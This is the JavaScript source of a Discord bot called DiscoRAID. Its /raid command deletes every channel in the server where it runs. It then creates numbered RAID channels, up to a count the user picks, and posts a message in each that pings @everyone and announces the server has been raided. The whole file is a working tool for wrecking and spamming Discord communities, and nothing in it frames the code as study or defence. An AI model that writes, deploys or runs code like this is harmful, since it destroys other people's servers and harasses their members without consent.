const { Client, IntentsBitField, ChannelType } = require('discord.js');

// Load environment variables
require('dotenv').config();

const client = new Client({ 
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ]
});

client.login(process.env.TOKEN);

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}! ✅`);
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'online') {
    interaction.reply('DiscoRAID is online ! ✅');
  }

  if (interaction.commandName === 'raid') {
    // Check if the user has the necessary permissions (e.g., MANAGE_CHANNELS)

    // defaults
    defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${client.user} !!! \n @everyone`
    defaultSpamAMT = 10;


    let spamAMTbyUser = interaction.options.getInteger('message-amount')
    let userMessage = interaction.options.getString('raid-message');

    if (userMessage == null) {
      userMessage = defaultMessage
    }

    if (spamAMTbyUser == null) {
      spamAMTbyUser = defaultSpamAMT
    }
  
    // Get the guild
    const guild = interaction.guild;

    // Fetch all channels and delete them
    try {
      await guild.channels.cache.forEach(channel => channel.delete());
    } catch (error) {
      interaction.reply({content: 'FAILED TO RAID! BOT NOT GIVEN PERMISSIONS.'})
      return;
    }

    interaction.reply({ content: 'All channels have been removed.', ephemeral: true });


    try {
      const newChannel = await guild.channels.create({
        
        name: 'RAID', 
        
        type: ChannelType.GuildText,
      });


      try{
        
        for (let i = 0; i < spamAMTbyUser; i++) {
          // Duplicate the channel
          const duplicateChannel = await guild.channels.create({
            name: `RAID-${i+1}`,
            type: ChannelType.GuildText,
            parent: newChannel.parent, // Set the same parent as the original channel if applicable
          });
      
          // Send message to duplicate channel
          await duplicateChannel.send(userMessage);
      }
      } catch (error) {
        console.error("Error creating duplicate channels:", error);
      }
      
      
    } catch (error) {

        console.log(`an error has occured, ${error}`)
        return;
    }
    
    // Send the user's message in the new channel
  }
});

client.on('messageCreate', (message) => {
  if (message.content === '<@1150483197503741962>') {
    message.reply('Bot is Online ✅');
  }
});
